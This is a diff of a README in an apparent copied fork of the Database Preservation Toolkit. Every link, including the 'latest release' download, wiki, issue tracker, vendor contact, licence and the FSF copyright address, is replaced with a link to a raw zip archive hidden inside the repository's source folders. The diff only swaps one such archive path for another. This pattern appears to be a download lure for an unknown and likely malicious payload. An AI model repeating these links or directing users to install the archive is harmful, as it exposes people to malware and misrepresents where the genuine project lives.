@@ -1,49 +1,49 @@
-[![CI](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)
+[![CI](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip)](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip)
 
 # Database Preservation Toolkit Enterprise/Desktop
 Formerly known as Database Visualization Toolkit
 
-Lightweight web viewer for relational databases, specially if preserved in SIARD 2, that uses SOLR as a backend, and allows browsing, search, and export. It uses the [Database Preservation Toolkit](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) to process new relational databases that are in the SIARD2 format or on the original live DBMS.
+Lightweight web viewer for relational databases, specially if preserved in SIARD 2, that uses SOLR as a backend, and allows browsing, search, and export. It uses the [Database Preservation Toolkit](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip) to process new relational databases that are in the SIARD2 format or on the original live DBMS.
 
 A comprehensive list of features, screenshots and other documentation will be produced soon and available here.
 
 ## Install and use Database Preservation Toolkit Desktop
 
-To use this system in the desktop app modality, download the [latest release](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) and install on your Desktop system. There are installation options of Windows, MacOS and Linux.
+To use this system in the desktop app modality, download the [latest release](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip) and install on your Desktop system. There are installation options of Windows, MacOS and Linux.
 
 ## Setting up the Database Preservation Toolkit Enterprise
 
 After version 2.0.0 the deployment is made using docker containers and docker compose.
 
-Check [Database Preservation Toolkit Enterprise](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) for more information.
+Check [Database Preservation Toolkit Enterprise](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip) for more information.
 
 ## More information
 
-Configuration options are detailed in the [Wiki](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
+Configuration options are detailed in the [Wiki](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip).
 
-DBPTK logos can be downloaded [here](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
+DBPTK logos can be downloaded [here](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip).
 
-More information about these tools can be found at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
+More information about these tools can be found at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip
 
 ## To report a problem or make a suggestion
 
-Create a new issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
+Create a new issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip
 
-Or if the problem/suggestion is related to the Database Preservation Toolkit Developer, create the issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
+Or if the problem/suggestion is related to the Database Preservation Toolkit Developer, create the issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip
 
 ## Information & Commercial support
 
-For more information or commercial support, contact [KEEP SOLUTIONS](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
+For more information or commercial support, contact [KEEP SOLUTIONS](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip).
 
 ## License
 
-Database Visualization Toolkit licence is [LGPLv3](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)
+Database Visualization Toolkit licence is [LGPLv3](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip)
 
 ```
                    GNU LESSER GENERAL PUBLIC LICENSE
                        Version 3, 29 June 2007
 
- Copyright (C) 2007 Free Software Foundation, Inc. <https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip>
+ Copyright (C) 2007 Free Software Foundation, Inc. <https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/webapp/js/copy_ui_dbptk_1.6.zip>
  Everyone is permitted to copy and distribute verbatim copies
  of this license document, but changing it is not allowed.
 
